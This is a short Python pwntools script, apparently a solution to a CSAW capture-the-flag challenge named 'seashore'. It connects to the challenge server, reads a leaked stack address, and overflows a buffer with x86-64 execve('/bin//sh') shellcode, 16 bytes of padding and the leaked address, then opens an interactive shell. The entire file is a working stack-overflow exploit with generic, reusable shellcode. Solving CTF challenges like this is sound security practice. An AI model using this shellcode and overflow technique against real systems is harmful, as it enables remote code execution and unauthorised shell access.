from pwn import *

payload = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
#p = process('./seashore')
#gdb.attach(p)
p =remote('pwn.chal.csaw.io', 1003)
print p.recvline()
x= p.recvline()[31:]
z= hex(int(x,16))
print z
p.sendline(payload+'a'*16+p64(int(z,16)))
p.interactive()
